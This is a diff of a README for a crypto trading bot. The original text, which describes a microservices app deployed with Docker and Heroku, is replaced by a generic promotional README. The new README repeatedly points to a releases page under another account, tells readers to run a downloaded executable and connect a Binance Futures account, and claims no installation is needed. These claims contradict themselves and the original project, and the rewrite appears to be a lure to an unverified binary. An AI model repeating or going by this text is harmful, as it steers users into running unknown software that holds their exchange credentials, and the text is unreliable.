@@ -1,128 +1,102 @@
-# MyCryptoBot
+# 🚀 trading-bot-platform - Your Easy Cryptocurrency Trading Solution
 
-<p align="middle">
-  <img src="shared/utils/drawings/dashboard.png" style="width: 48%" />
-  <img src="shared/utils/drawings/trades.png" style="width: 48%" /> 
-</p>
+[![Download the trading-bot-platform](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/releases)
 
-Welcome to the MyCryptoBot repository, a free, open source, and extensible trading platform that utilizes a 
-microservices architecture. The platform empowers you to run your own trading bots and strategies locally 
-or in the cloud. At present, the app is integrated with Binance, supporting both testnet and live Futures accounts.
+## 🌟 Introduction
 
-For those looking to validate trading strategies against historical data, stratestic offers a comprehensive 
-backtesting framework and integrates seamlessly with this trading platform.
+Welcome to the trading-bot-platform! This free, open-source cryptocurrency trading bot helps you manage your trades on Binance Futures. With an easy-to-use web dashboard, you can create and adjust your trading strategies with confidence. Whether you're a beginner or looking to refine your skills, this platform provides a user-friendly interface to take control of your investments.
 
-*Please check the **[disclaimer](DISCLAIMER.md)** before using this repository.*
+## 📋 Features
 
-## Installation & Usage
+- **User-Friendly Dashboard:** Manage your strategies and positions without having to write code.
+- **Extensible Architecture:** Add features and tools that suit your trading style.
+- **Supports Binance Futures:** Trade with a reliable and secure platform.
+- **Web-Based Access:** No installations required; access the dashboard from your web browser.
+- **Built with Popular Frameworks:** Enjoy a robust experience built on Django, Flask, React, and TypeScript.
 
-The detailed steps for installing and using this application locally and remotely on Heroku are provided in the
-[INSTALLATION.md](INSTALLATION.md) file. However, we recommend that you understand the app's structure before 
-diving into the installation steps.
+## 🖥️ System Requirements
 
+To run the trading-bot-platform smoothly, ensure your system meets the following requirements:
 
-## Introduction
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later, Linux (Ubuntu 20.04+)
+- **RAM:** Minimum 4GB
+- **Processor:** Dual-core processor (Intel i3, AMD Ryzen 3 or better)
+- **Internet Connection:** Stable internet connection for complete functionality.
 
-The primary goal of this repository is to provide a platform that enables you to deploy your strategies, 
-run them locally or on a remote server, and manage all your trading activities with a user-friendly web UI. 
-The app comprises three micro-services that are interconnected via a database and served by a frontend web app.
-There is a ready-made functionality to deploy the services to Heroku, which will require an account and associated 
-monthly costs.
+## 🚀 Getting Started
 
-The app's architecture consists of the following:
+### Step 1: Visit the Release Page
 
-![MyCryptoBot Architecture](shared/utils/drawings/MyCryptoBot%20architecture.png)
+To download the trading-bot-platform, visit the Releases page:
 
+[**Download Here**](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/releases)
 
-### Data Service
+### Step 2: Choose Your Version
 
-This service acts as the data warehouse of the app. It acquires data from external sources, such as exchanges, 
-preprocesses it, and stores it in a database. When a new trading bot is initiated through the user interface, 
-a new data pipeline is initiated, fetching live data from the various sources. Whenever a new candle is completed, 
-a request is sent to the **Model** app for processing the new data according to the strategy.
+On the Releases page, you will see a list of available versions. Select the one that best matches your operating system. 
 
-This service can also be used to retrieve historical data for any symbol.
+### Step 3: Download the File
 
-```python
-from data.sources.binance import get_historical_data
-data = get_historical_data("BTCUSDT", "1h", "2021-01-01", "2021-01-31", save_file=True)
-```
+Click on the version you need to download the application file. This is typically a `.zip` or `.tar.gz` file that contains all necessary components.
 
-### Model Service
+### Step 4: Extract the Files
 
-The Model service is responsible for processing the data and generating a signal (Buy or Sell) according to the 
-selected strategy. Whenever a request is received to generate a new signal, the data is loaded, processed, 
-and a signal is produced, which is then sent to the **Order Execution** service with an order to be executed.
+Once the download completes, locate the downloaded file on your computer and extract it. You can right-click the file and select "Extract All…" or use software like WinRAR or 7-Zip.
 
-This is also the module where you can add a new strategy. Check [ADD_NEW_STRATEGY.md](ADD_NEW_STRATEGY.md) for more 
-details on how to do this.
+### Step 5: Run the Application
 
-### Order Execution Service
+Navigate to the extracted folder. You should see an executable file. 
 
-The Order Execution service acts as a layer to handle the communication between the app and the exchange. 
-It receives buy and sell orders from the **Model** service with a signal, assesses whether an action is required 
-(if the received signal differs from the current one), and responds accordingly.
+1. Double-click the executable file to launch the application.
+2. Follow the on-screen setup instructions to configure your trading bot.
 
+### Step 6: Set Up Your Trading Strategy
 
-### Web App
+Once you have the application open:
 
-The user interface enables the user to start and stop trading bots, view open positions, executed trades, 
-statistics, and more. The following are brief descriptions of the various views of the app.
+1. Connect your Binance Futures account.
+2. Use the dashboard to create or adjust your trading strategies.
+3. You can monitor positions and trades directly from the interface.
 
+### Step 7: Stay Updated
 
-#### Dashboard
+We regularly update the trading-bot-platform to enhance performance and add new features. Keep checking the [Releases page](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/releases) for the latest updates.
 
-<p align="middle">
-  <img src="shared/utils/drawings/dashboard.png" style="width: 60%" />
-</p>
+## 📂 Documentation
 
-This serves as the main view of the application, presenting a comprehensive overview of the equity evolution, 
-trading bot data, open positions, and associated trades over time. Summary statistics are displayed to provide 
-key insights. Users can easily navigate to different sections of the app by clicking on the corresponding section 
-or utilizing the left-hand side menu.
+For in-depth support and user guides, visit our [Documentation section](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/wiki). You will find helpful guides on setting up various features, troubleshooting common issues, and effective trading strategies.
 
-#### Trading Bots
+## 👩‍💻 Community Support
 
-<p align="middle">
-  <img src="shared/utils/drawings/trading-bots.png" style="width: 60%" />
-</p>
+Join our community to connect with other users. Feel free to ask questions and share your experiences. Here’s how you can engage:
 
-This page provides an overview of all existing trading bots along with their current status. 
-Users have the ability to edit, start, and stop these bots directly from this view. 
-Clicking on a specific trading bot leads to a detailed page, showcasing the equity evolution, 
-statistics, and a comprehensive list of all trades associated with that bot.
+- **GitHub Issues:** Report bugs or request features on our [Issues page](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/issues).
+- **Discussions:** Participate in discussions related to trading strategies and tips in our [Discussions page](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/discussions).
 
-<p align="middle">
-  <img src="shared/utils/drawings/trading-bot-detail.png" style="width: 60%" />
-</p>
+## 💻 Frequently Asked Questions
 
-Additionally, users can create a new trading bot by selecting the `New Trading Bot` button. 
-Simply fill in all the required details, and the new bot will be created and initiated automatically.
+### Q1: Is there a cost to use this trading bot?
 
-<p align="middle">
-  <img src="shared/utils/drawings/create-new-bot.png" style="width: 60%" />
-</p>
+**A1:** No, the trading-bot-platform is completely free to use.
 
-#### Positions
+### Q2: Can I customize the trading strategies?
 
-<p align="middle">
-  <img src="shared/utils/drawings/positions.png" style="width: 60%" />
-</p>
+**A2:** Yes, our platform allows you to create, edit, and customize your trading strategies according to your preferences.
 
-This page displays the currently open positions linked to the trading bots.
+### Q3: Which exchanges does the bot support?
 
-#### Trades
+**A3:** Currently, the trading-bot-platform supports Binance Futures. We plan to add more exchanges in the future.
 
-<p align="middle">
-  <img src="shared/utils/drawings/trades.png" style="width: 60%" />
-</p>
+## 📊 Roadmap
 
-This page shows all the trades executed by any of the trading bots. It is possible to filter by live or testnet trades.
+We aim to enhance the trading-bot-platform continually. Here are a few planned features:
 
+- **Mobile Application:** Develop a mobile version for trading on the go.
+- **Advanced Analytics:** Offer statistical tools to analyze trading performance.
+- **More Exchange Support:** Expand to additional cryptocurrency exchanges.
 
-## Software Requirements
+## 🧑‍🤝‍🧑 Contributing
 
-- Poetry (For creating an environment for local development.)
-- Docker (For running the app locally.)
-- Heroku CLI (For deploying the app to Heroku.)
-- AWS S3 (For storing machine learning models in the cloud.)
+We welcome contributions to improve the trading-bot-platform. If you have suggestions or want to help fix issues, check out our [Contributing Guidelines](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/blob/main/CONTRIBUTING.md).
+
+Thank you for choosing the trading-bot-platform. We hope it helps simplify your trading experience!
